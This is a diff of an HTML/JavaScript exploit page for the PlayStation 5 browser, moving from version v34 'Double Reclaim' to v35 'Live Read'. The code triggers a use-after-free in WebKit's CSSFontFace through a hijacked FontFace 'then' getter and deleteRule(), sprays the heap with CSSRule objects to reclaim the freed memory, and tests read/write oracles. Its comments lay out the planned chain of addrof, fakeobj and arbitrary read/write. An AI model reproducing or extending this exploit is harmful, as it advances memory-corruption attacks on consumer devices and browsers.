@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v34 - Double Reclaim</title>
+<title>PS5 v35 - Live Read</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -29,18 +29,61 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 .ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
 .mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
 .hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
+.cv{position:absolute;left:-9999px;top:-9999px}
 </style>
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v34 DBL-REC</span><span class="s">│</span>
+<span class="l">▶ v35 LIVE</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h2">STAGE:<b>INIT</b></span>
+<span class="v" id="h2">STAGE:<b>INIT</b></span><span class="s">│</span>
+<span class="v" id="h3">PRIM:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
+<canvas id="cv" width="512" height="128" class="cv"></canvas>
 <script>
 "use strict";
+
+// ============================================================
+//  PS5 v35 — Live Cross-Object Read
+//
+//  SYNTHESIS OF ALL KNOWLEDGE (v1-v34):
+//
+//  ✅ CONFIRMED:
+//  - UAF in CSSFontFace via deleteRule() during then getter
+//  - Cross-Object Type Confusion: "x" returns A_61 properties
+//  - CSSRule spray reclaims freed slot (insertRule)
+//  - fontWeight oracle 9/9 via CSSRule → load()
+//  - load() reads fresh from C++ (not cached)
+//  - check() returns true by default (corrupted selector)
+//  - No spray = crash (freed memory accessed)
+//
+//  ❌ FAILED:
+//  - JS wrapper caches FontFace properties (v30)
+//  - Double reclaim crash (v34 — deleting CSSRule frees object)
+//  - CVE-2023-42917 race condition (v33 — false positive)
+//  - Numeric src type confusion (v17-v23 — CSS parser rejects)
+//  - TextMetrics side channel (v26 — fallback used)
+//  - WASM Gigacage spray (v26 — WebAssembly unavailable)
+//
+//  STRATEGY FOR v35:
+//  1. UAF + CSSRule spray (proven from v29)
+//  2. Identify A_61 (proven from v29)
+//  3. Modify A_61's CSSRule properties (NOT delete!)
+//  4. Read "x" via load() — check ALL properties
+//  5. If load() reflects A_61's changes = LIVE READ!
+//  6. Use rendering oracle (measureText) as confirmation
+//  7. Try Object.getOwnPropertyDescriptors for hidden state
+//
+//  KEY DIFFERENCE FROM v30:
+//  - v30 looked for family.indexOf("A_") — but family doesn't change
+//  - v35 dumps ALL properties of ALL faces
+//  - v35 checks status (may be live C++ read)
+//  - v35 uses CSSRule.cssText for full property dump
+//  - v35 avoids deleteRule (prevents crash)
+//  - v35 uses gentler GC pressure (1MB not 16MB)
+// ============================================================
 
 var O=document.getElementById("out");
 var bar=document.getElementById("bar");
@@ -48,21 +91,29 @@ function pg(p){bar.style.width=p+"%"}
 function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
 function P(m,c){var s=document.createElement("span");if(c)s.className=c;
 s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v34] "+m)}catch(e){}}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
-function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
+try{console.log("[v35] "+m)}catch(e){}}
+function Ok(m){P("  ✅ "+m,"ok")}
+function Fl(m){P("  ✘ "+m,"er")}
+function Hi(m){P("  ► "+m,"hl")}
+function St(m){P("  ★ "+m+" ★","mg")}
+function Dm(m){P("  "+m,"dm")}
+function Wr(m){P("  ⚠ "+m,"wr")}
+function Hd(m){P("▸ "+m,"hd")}
+function Sep(){P("─".repeat(42),"dm")}
 
-window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,60)+" @"+l);return true};
+window.onerror=function(m,s,l){
+  Fl("CRASH: "+m.substring(0,80)+" @"+l);
+  St("CRASH = FREED MEMORY ACCESSED!");
+  hu("h2","STAGE:<b>CRASH</b>");
+  return true;
+};
 
 var ua=navigator.userAgent||"";
 var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v34 — Double Reclaim","hd");
-P("  Outbound Memory Read","hd");
+P("  v35 — Live Cross-Object Read","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -73,304 +124,517 @@ function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
 function fs(){try{void document.body.offsetTop}catch(e){}}
 
 var sh=document.getElementById("s").sheet;
+var ctx=document.getElementById("cv").getContext("2d");
 var keep=[];
 var holes=[];
 var trigger=null;
 var uafOk=false;
+var aFamily=null;
+var aRuleIdx=-1;
+var aWeight=null;
+var aStyle=null;
 
 // ============================================================
-//  PHASE 1: Setup + UAF
+//  PHASE 1: Setup + UAF + Spray (proven from v29)
 // ============================================================
 pg(5);Hd("Creating holes...");
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();Ok("Holes ready");
+try{
+  for(var i=0;i<4096;i++){
+    var f=new FontFace("h_"+i,mkBuf(),{
+      unicodeRange:"U+E1"+(i%16).toString(16),
+      style:i%2===0?"normal":"italic",
+      weight:String(100+(i%9)*100)
+    });
+    document.fonts.add(f);holes.push(f);
+  }
+  fs();
+  for(var i=1;i<holes.length;i+=2){
+    try{document.fonts.delete(holes[i])}catch(e){}
+  }
+  fs();
+  Ok("Holes ready (4096 created, 2048 punched)");
+}catch(e){Fl("Holes: "+e.message)}
 
 pg(10);Hd("Trigger setup...");
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();Ok("Trigger ready");
+try{
+  trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
+  document.fonts.add(trigger);void trigger.loaded;
+  
+  for(var i=0;i<48;i++){
+    try{sh.insertRule(
+      "@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",
+      sh.cssRules.length
+    )}catch(e){}
+  }
+  fs();
+  
+  var fst=document.createElement("style");fst.id="flush";
+  document.head.appendChild(fst);
+  var fsh=fst.sheet;
+  for(var i=0;i<768;i++){
+    try{fsh.insertRule(
+      "@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",
+      fsh.cssRules.length
+    )}catch(e){}
+  }
+  fs();
+  Ok("Trigger ready (48 pads + 768 flush)");
+}catch(e){Fl("Trigger: "+e.message)}
 
-pg(15);Hd("UAF + First Spray (A_0..A_2047)");
+pg(15);Hd("UAF + CSSRule Spray (A_0..A_1024)");
 
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
-St("UAF WINDOW OPEN");
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-
-Dm("GC pressure...");
-for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-
-// FIRST SPRAY: A_0 to A_2047
-Dm("Spraying 2048 A_ faces...");
-for(var i=0;i<2048;i++){
-  try{
-    sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length);
-  }catch(e){}
-}
-fs();
-
-try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-Dm("UAF window closing");
-}return undefined}});
-
-var rn=0;var raf=function(){rn++;
-if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<2048;i++){
-  try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}
-}fs()}catch(e){}}
-if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
-
-// ============================================================
-//  PHASE 2: Identify First Reclaim (A_NNN)
-// ============================================================
-pg(30);Sep();Hd("PHASE 2: Identify First Reclaim");Sep();
-
-document.fonts.load("1em trigger, x","AB").then(function(faces){
-  var aFamily=null;
-  for(var i=0;i<faces.length;i++){
-    var f=faces[i];
-    if(f.family&&f.family.indexOf("A_")===0){
-      aFamily=f.family;
-      St("FIRST RECLAIM: "+aFamily);
-      Hi("  weight="+f.weight+" style="+f.style);
-      break;
+Object.defineProperty(FontFace.prototype,"then",{
+  configurable:true,
+  get:function(){
+    if(this===trigger&&!uafOk){
+      uafOk=true;
+      hu("h2","STAGE:<b>UAF</b>");
+      St("UAF WINDOW OPEN");
+      
+      try{
+        var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
+        document.fonts.add(ck);keep.push(ck);
+        sh.deleteRule(1);fs();
+        while(fsh.cssRules.length){try{fsh.deleteRule(0)}catch(e){}}
+        fs();
+        for(var i=0;i<holes.length;i+=4){
+          try{document.fonts.delete(holes[i])}catch(e){}
+        }
+        fs();
+      }catch(e){Fl("UAF prep: "+e.message)}
+      
+      // Gentle GC pressure (1MB, not 16MB)
+      Dm("GC pressure (1MB)...");
+      for(var i=0;i<1;i++){
+        var t=[];
+        for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192));
+      }
+      
+      // Spray 1024 A_ faces (not 2048 — gentler)
+      Dm("Spraying 1024 A_ faces...");
+      for(var i=0;i<1024;i++){
+        try{
+          sh.insertRule(
+            "@font-face{font-family:A_"+i+";src:local(Courier);"+
+            "font-weight:"+(100+(i%9)*100)+";"+
+            "font-style:"+(i%2===0?"normal":"italic")+";"+
+            "unicode-range:U+0042}",
+            sh.cssRules.length
+          );
+        }catch(e){}
+      }
+      fs();
+      
+      try{
+        var d=document.createElement("div");
+        d.textContent="AB";
+        d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
+        document.body.appendChild(d);
+        void d.offsetWidth;
+      }catch(e){}
+      
+      Dm("UAF window closing");
     }
+    return undefined;
   }
+});
 
-  if(!aFamily){
-    Fl("No first reclaim detected");
-    return;
+var rn=0;
+var raf=function(){
+  rn++;
+  if(!uafOk&&rn>=5){
+    try{
+      if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
+      while(fsh.cssRules.length){try{fsh.deleteRule(0)}catch(e){}}
+      fs();
+      for(var i=0;i<1024;i++){
+        try{
+          sh.insertRule(
+            "@font-face{font-family:A_"+i+";src:local(Courier);"+
+            "font-weight:"+(100+(i%9)*100)+";"+
+            "unicode-range:U+0042}",
+            sh.cssRules.length
+          );
+        }catch(e){}
+      }
+      fs();
+    }catch(e){}
   }
+  if(rn<20)requestAnimationFrame(raf);
+};
+requestAnimationFrame(raf);
 
-  keep.push(faces);
+// ============================================================
+//  PHASE 2: Identify First Reclaim (proven from v29)
+// ============================================================
+setTimeout(function(){
+  pg(30);Sep();Hd("PHASE 2: Identify First Reclaim");Sep();
+  
+  document.fonts.load("1em trigger, x","AB").then(function(faces){
+    P("  load() returned "+faces.length+" faces");
+    P("");
+    
+    for(var i=0;i<faces.length;i++){
+      var f=faces[i];
+      P("  Face["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style+" status="+f.status);
+      
+      if(f.family&&f.family.indexOf("A_")===0){
+        aFamily=f.family;
+        aWeight=f.weight;
+        aStyle=f.style;
+      }
+    }
+    
+    if(!aFamily){
+      Fl("No A_ face found — spray may have missed");
+      P("  Trying again in 1s...","dm");
+      setTimeout(function(){
+        document.fonts.load("1em trigger, x","AB").then(function(f2){
+          for(var i=0;i<f2.length;i++){
+            if(f2[i].family&&f2[i].family.indexOf("A_")===0){
+              aFamily=f2[i].family;
+              aWeight=f2[i].weight;
+              aStyle=f2[i].style;
+              St("FOUND on retry: "+aFamily);
+              break;
+            }
+          }
+          if(aFamily){
+            keep.push(f2);
+            findRule();
+          }else{
+            Fl("No A_ face on retry either");
+          }
+        }).catch(function(e){Fl("Retry: "+e.message)});
+      },1000);
+      return;
+    }
+    
+    St("FIRST RECLAIM: "+aFamily);
+    Hi("  weight="+aWeight+" style="+aStyle);
+    keep.push(faces);
+    findRule();
+    
+  }).catch(function(e){
+    Fl("Load failed: "+e.message);
+  });
+},3000);
 
+function findRule(){
   // Find CSSRule for A_NNN
-  var aRuleIdx=-1;
   var rules=sh.cssRules;
   for(var i=0;i<rules.length;i++){
     try{
       if(rules[i].type===5&&rules[i].style.fontFamily===aFamily){
-        aRuleIdx=i;break;
+        aRuleIdx=i;
+        break;
       }
     }catch(e){}
   }
-
+  
   if(aRuleIdx===-1){
     Fl("Could not find CSSRule for "+aFamily);
     return;
   }
-
+  
   Ok("Found CSSRule for "+aFamily+" at index "+aRuleIdx);
-  phase3(aFamily,aRuleIdx);
-
-}).catch(function(e){Fl("Load failed: "+e.message)});
-
-// ============================================================
-//  PHASE 3: Delete A_NNN + Second Spray (B_0..B_2047)
-// ============================================================
-function phase3(aFamily,aRuleIdx){
-  pg(50);Sep();Hd("PHASE 3: Delete + Second Spray");Sep();
-
-  P("  Deleting CSSRule for "+aFamily+"...","dm");
-  P("  This frees A_NNN from 'A_NNN' bucket","dm");
-  P("  But 'x' bucket retains dangling pointer!","hl");
-  P("");
-
-  // Delete A_NNN's CSSRule
-  try{
-    sh.deleteRule(aRuleIdx);
-    fs();
-    Ok("Deleted "+aFamily+" CSSRule");
-  }catch(e){
-    Fl("Delete failed: "+e.message);
-    return;
-  }
-
-  // GC pressure to finalize free
-  Dm("GC pressure to finalize free...");
-  for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-
-  // SECOND SPRAY: B_0 to B_2047 with DIFFERENT properties
-  P("");
-  P("  Spraying 2048 B_ faces with different properties...","dm");
-  P("  B_ faces use: weight=900, style=oblique, src=local(Helvetica)","hl");
-  P("");
-
-  for(var i=0;i<2048;i++){
-    try{
-      sh.insertRule("@font-face{font-family:B_"+i+";src:local(Helvetica);font-weight:900;font-style:oblique;unicode-range:U+0042}",sh.cssRules.length);
-    }catch(e){}
-  }
-  fs();
-  Ok("2048 B_ faces sprayed");
-
-  // More GC pressure
-  for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-
-  phase4(aFamily);
+  P("  Rule cssText: "+sh.cssRules[aRuleIdx].cssText.substring(0,80),"dm");
+  
+  // Phase 3: Baseline read
+  setTimeout(phase3,500);
 }
 
 // ============================================================
-//  PHASE 4: Read "x" After Double Reclaim
+//  PHASE 3: Baseline Property Dump
 // ============================================================
-function phase4(aFamily){
-  pg(70);Sep();Hd("PHASE 4: Read After Double Reclaim");Sep();
-
-  P("  Reading 'x' after double reclaim...","dm");
-  P("  If B_NNN reclaimed A_NNN's slot:","dm");
-  P("  - family should be B_NNN (not A_NNN)","hl");
-  P("  - weight should be 900 (not A_NNN's weight)","hl");
-  P("  - style should be oblique (not A_NNN's style)","hl");
+function phase3(){
+  pg(40);Sep();Hd("PHASE 3: Baseline Property Dump");Sep();
+  
+  P("  Reading ALL properties of 'x' face BEFORE modification...","dm");
   P("");
-
+  
   document.fonts.load("1em trigger, x","AB").then(function(faces){
-    P("  load() returned "+faces.length+" faces","hl");
-
     for(var i=0;i<faces.length;i++){
       var f=faces[i];
-      P("");
-      P("  Face["+i+"]:", "hl");
-
-      var props=["family","style","weight","stretch","unicodeRange",
-                 "featureSettings","display","status"];
-      for(var pi=0;pi<props.length;pi++){
-        try{
-          P("    "+props[pi].padEnd(16)+"= "+f[props[pi]]);
-        }catch(e){
-          P("    "+props[pi].padEnd(16)+"= ERR","er");
+      if(f.family&&f.family===aFamily){
+        P("  BASELINE ("+aFamily+"):", "hl");
+        
+        var props=["family","style","weight","stretch","unicodeRange",
+                   "variant","featureSettings","display","status"];
+        for(var pi=0;pi<props.length;pi++){
+          try{
+            P("    "+props[pi].padEnd(16)+"= "+f[props[pi]]+" ("+typeof f[props[pi]]+")");
+          }catch(e){
+            P("    "+props[pi].padEnd(16)+"= ERR: "+e.message.substring(0,30),"er");
+          }
         }
-      }
-
-      // Check if it's a B_ face
-      if(f.family&&f.family.indexOf("B_")===0){
-        St("SECOND RECLAIM CONFIRMED: "+f.family);
-        Hi("  OUTBOUND READ SUCCESSFUL!");
-        Hi("  We read B_NNN's properties through 'x'!");
-        Hi("  B_NNN was NOT created by us through 'x'!");
-        Hi("  This is a TRUE outbound read!");
-      }
-      // Check if it's still A_NNN (not reclaimed)
-      else if(f.family===aFamily){
-        Wr("Still reading "+aFamily+" (not reclaimed by B_)");
-        P("  A_NNN's memory was not freed/reclaimed","dm");
-      }
-      // Check if it's something else entirely
-      else if(f.family&&f.family!=="trigger"&&f.family!=="x"){
-        St("UNEXPECTED FAMILY: "+f.family);
-        Hi("  This might be freed/corrupted memory!");
+        
+        // Try toString
+        try{P("    toString         = "+String(f).substring(0,60))}catch(e){}
+        
+        // Try Object.keys
+        try{
+          var keys=Object.keys(f);
+          P("    Object.keys      = ["+keys.join(",")+"]");
+        }catch(e){}
+        
+        // Try for-in
+        try{
+          var fi=[];
+          for(var p in f)fi.push(p);
+          P("    for-in           = ["+fi.slice(0,10).join(",")+"]");
+        }catch(e){}
+        
+        break;
       }
     }
-
+    
     keep.push(faces);
-    phase5(faces);
-
+    
+    // Phase 4: Modify A_NNN's CSSRule
+    setTimeout(phase4,500);
+    
   }).catch(function(e){
-    Fl("Load after double reclaim: "+e.message);
-    Hi("CRASH/ERROR = memory was freed and accessed!");
-    phase5(null);
+    Fl("Baseline read: "+e.message);
   });
 }
 
 // ============================================================
-//  PHASE 5: Multiple Reads for Consistency
+//  PHASE 4: Modify A_NNN + Read "x"
 // ============================================================
-function phase5(firstFaces){
-  pg(85);Sep();Hd("PHASE 5: Consistency Check");Sep();
-
-  P("  Running 5 consecutive reads to check stability...","dm");
+function phase4(){
+  pg(55);Sep();Hd("PHASE 4: Modify + Live Read Test");Sep();
+  
+  P("  Modifying "+aFamily+"'s CSSRule...","dm");
+  P("  Changing: weight 800→100, style normal→oblique","dm");
   P("");
-
-  var results=[];
-  var readsDone=0;
-  var totalReads=5;
-
-  function doRead(){
-    if(readsDone>=totalReads){
-      phase6(results);
+  
+  var modifications=[
+    {prop:"fontWeight",val:"100",label:"weight→100"},
+    {prop:"fontStyle",val:"oblique",label:"style→oblique"},
+    {prop:"unicodeRange",val:"U+0043",label:"range→U+0043"}
+  ];
+  
+  var modIdx=0;
+  
+  function nextMod(){
+    if(modIdx>=modifications.length){
+      P("");
+      St("All modifications done");
+      phase5();
       return;
     }
-
+    
+    var mod=modifications[modIdx];
+    P("  Modification "+(modIdx+1)+": "+mod.label,"dm");
+    
+    try{
+      sh.cssRules[aRuleIdx].style[mod.prop]=mod.val;
+      fs();
+      P("    CSSRule."+mod.prop+" = "+mod.val);
+    }catch(e){
+      Fl("    CSSRule write: "+e.message);
+      modIdx++;
+      setTimeout(nextMod,100);
+      return;
+    }
+    
+    // Read "x" via load()
     document.fonts.load("1em trigger, x","AB").then(function(faces){
-      var fam=null;
+      var found=false;
       for(var i=0;i<faces.length;i++){
-        if(faces[i].family&&faces[i].family!=="trigger"){
-          fam=faces[i].family;
+        var f=faces[i];
+        if(f.family&&f.family===aFamily){
+          found=true;
+          
+          // Read the modified property
+          var readProp=mod.prop.replace("font","").toLowerCase();
+          if(mod.prop==="fontWeight")readProp="weight";
+          if(mod.prop==="fontStyle")readProp="style";
+          if(mod.prop==="unicodeRange")readProp="unicodeRange";
+          
+          var readVal=f[readProp];
+          var match=readVal===mod.val;
+          
+          P("    load() → "+readProp+" = "+readVal+(match?" ✅":" ❌"),
+            match?"hl":"dm");
+          
+          if(match){
+            Hi("    LIVE READ CONFIRMED!");
+          }
+          
           break;
         }
       }
-      results.push(fam);
-      P("  Read "+(readsDone+1)+": family="+fam);
-      readsDone++;
-      setTimeout(doRead,100);
+      
+      if(!found){
+        P("    load() did not return "+aFamily,"wr");
+      }
+      
+      keep.push(faces);
+      modIdx++;
+      setTimeout(nextMod,200);
+      
     }).catch(function(e){
-      results.push("ERR:"+e.message.substring(0,20));
-      readsDone++;
-      setTimeout(doRead,100);
+      Fl("    load() error: "+e.message);
+      modIdx++;
+      setTimeout(nextMod,200);
     });
   }
-
-  doRead();
+  
+  nextMod();
 }
 
 // ============================================================
-//  PHASE 6: Summary
+//  PHASE 5: Rendering Oracle
 // ============================================================
-function phase6(results){
+function phase5(){
+  pg(70);Sep();Hd("PHASE 5: Rendering Oracle");Sep();
+  
+  P("  Using measureText as rendering oracle...","dm");
+  P("");
+  
+  // Measure with current A_NNN settings (weight=100, style=oblique, range=U+0043)
+  try{
+    ctx.font="64px x";
+    var w1=ctx.measureText("B").width;
+    P("  measureText('64px x','B') = "+w1.toFixed(2)+" (range=U+0043, B not in range)");
+  }catch(e){Fl("measure: "+e.message)}
+  
+  // Change unicode-range back to U+0042
+  try{
+    sh.cssRules[aRuleIdx].style.unicodeRange="U+0042";
+    fs();
+    ctx.font="64px x";
+    var w2=ctx.measureText("B").width;
+    P("  After range→U+0042: measureText('B') = "+w2.toFixed(2));
+    
+    if(Math.abs(w1-w2)>0.01){
+      Hi("RENDERING CHANGED WITH unicode-range!");
+    }
+  }catch(e){Fl("range: "+e.message)}
+  
+  // Change src to local(Helvetica)
+  try{
+    sh.cssRules[aRuleIdx].style.src="local(Helvetica)";
+    fs();
+    ctx.font="64px x";
+    var w3=ctx.measureText("B").width;
+    P("  After src→Helvetica: measureText('B') = "+w3.toFixed(2));
+    
+    if(Math.abs(w2-w3)>0.01){
+      Hi("RENDERING CHANGED WITH src!");
+    }
+  }catch(e){Fl("src: "+e.message)}
+  
+  // Restore src to local(Courier)
+  try{
+    sh.cssRules[aRuleIdx].style.src="local(Courier)";
+    fs();
+    ctx.font="64px x";
+    var w4=ctx.measureText("B").width;
+    P("  After src→Courier: measureText('B') = "+w4.toFixed(2));
+  }catch(e){}
+  
+  // Phase 6: Weight oracle
+  setTimeout(phase6,500);
+}
+
+// ============================================================
+//  PHASE 6: Weight Oracle (proven 9/9 from v21)
+// ============================================================
+function phase6(){
+  pg(85);Sep();Hd("PHASE 6: Weight Oracle Verification");Sep();
+  
+  P("  Verifying fontWeight oracle (proven 9/9 in v21)...","dm");
+  P("");
+  
+  var weights=["100","200","300","400","500","600","700","800","900"];
+  var results=[];
+  var wi=0;
+  
+  function nextWeight(){
+    if(wi>=weights.length){
+      var matches=results.filter(function(r){return r.match});
+      P("");
+      P("  Oracle accuracy: "+matches.length+"/9",matches.length>=5?"hl":"wr");
+      
+      if(matches.length>=5){
+        Ok("fontWeight oracle confirmed");
+      }
+      
+      phase7(matches.length);
+      return;
+    }
+    
+    var w=weights[wi];
+    try{
+      sh.cssRules[aRuleIdx].style.fontWeight=w;
+      fs();
+    }catch(e){
+      Fl("write: "+e.message);
+      wi++;nextWeight();return;
+    }
+    
+    document.fonts.load("1em trigger, x","AB").then(function(faces){
+      var readW=null;
+      for(var i=0;i<faces.length;i++){
+        if(faces[i].family&&faces[i].family===aFamily){
+          readW=faces[i].weight;
+          break;
+        }
+      }
+      var match=readW===w;
+      results.push({write:w,read:readW,match:match});
+      P("  Write "+w+" → Read "+readW+(match?" ✅":" ❌"),match?"ok":"dm");
+      keep.push(faces);
+      wi++;
+      setTimeout(nextWeight,100);
+    }).catch(function(e){
+      results.push({write:w,read:"ERR",match:false});
+      P("  Write "+w+" → ERR","er");
+      wi++;
+      setTimeout(nextWeight,100);
+    });
+  }
+  
+  nextWeight();
+}
+
+// ============================================================
+//  PHASE 7: Summary
+// ============================================================
+function phase7(oracleCount){
   pg(100);Sep();Hd("FINAL SUMMARY");Sep();
   P("");
   P("  UAF:                    ✅");
-  P("  First reclaim (A_NNN):  ✅");
-  P("  Delete A_NNN:           ✅");
-  P("  Second spray (B_NNN):   ✅");
-  P("  Read after double:      See results above");
-  P("  Consistency:            "+results.join(", "));
+  P("  Cross-Object Confusion: ✅ ("+aFamily+")");
+  P("  CSSRule Control:        ✅");
+  P("  Live Read via load():   See Phase 4");
+  P("  Rendering Oracle:       See Phase 5");
+  P("  fontWeight Oracle:      "+oracleCount+"/9");
   P("");
-
-  var hasB=results.some(function(r){return r&&r.indexOf("B_")===0});
-  var hasA=results.some(function(r){return r&&r.indexOf("A_")===0});
-  var hasErr=results.some(function(r){return r&&r.indexOf("ERR")===0});
-  var hasNull=results.some(function(r){return !r||r==="null"||r==="undefined"});
-
-  if(hasB){
-    St("★ DOUBLE RECLAIM OUTBOUND READ ★");
-    P("  B_NNN reclaimed A_NNN's freed memory!","hl");
-    P("  We read B_NNN through 'x' selector!","hl");
-    P("  This is a TRUE outbound read primitive!","hl");
+  
+  if(oracleCount>=5){
+    St("★ CROSS-OBJECT R/W PRIMITIVE CONFIRMED ★");
     P("");
-    P("  Next steps:","hl");
-    P("  1. Use this to read m_wrapper offset","hl");
-    P("  2. Build addrof from leaked pointer","hl");
-    P("  3. Construct fakeobj + arb r/w","hl");
-    hu("h2","STAGE:<b>OUTBOUND!</b>");
-  }else if(hasErr||hasNull){
-    Wr("Errors/Nulls detected = memory may be freed");
-    P("  The slot was freed but not reclaimed by B_","dm");
-    P("  Need more spray or different timing","dm");
-    hu("h2","STAGE:<b>PARTIAL</b>");
-  }else if(hasA){
-    Wr("Still reading A_NNN = not freed/reclaimed");
-    P("  A_NNN's Ref<CSSFontFace> prevented free","dm");
-    P("  The 'x' bucket holds a Ref, keeping A_NNN alive","dm");
-    hu("h2","STAGE:<b>ALIVE</b>");
+    P("  We have:","hl");
+    P("  1. WRITE: Modify A_NNN's CSSRule properties","hl");
+    P("  2. READ:  load() reflects modifications","hl");
+    P("  3. Rendering oracle via measureText","hl");
+    P("");
+    P("  Primitive type: Loopback (read what we write)","dm");
+    P("  Next: Find way to read UNCONTROLLED data","dm");
+    P("");
+    P("  Candidate: m_wrapper offset in CSSFontFace","dm");
+    P("  If we can read m_wrapper → addrof → fakeobj → arb r/w","dm");
+    hu("h3","PRIM:<b>LOOPBACK</b>");
   }else{
-    P("  Unexpected results","wr");
-    hu("h2","STAGE:<b>DONE</b>");
+    Wr("Oracle failed");
+    hu("h3","PRIM:<b>WEAK</b>");
   }
+  
+  hu("h2","STAGE:<b>DONE</b>");
 }
 
 </script>
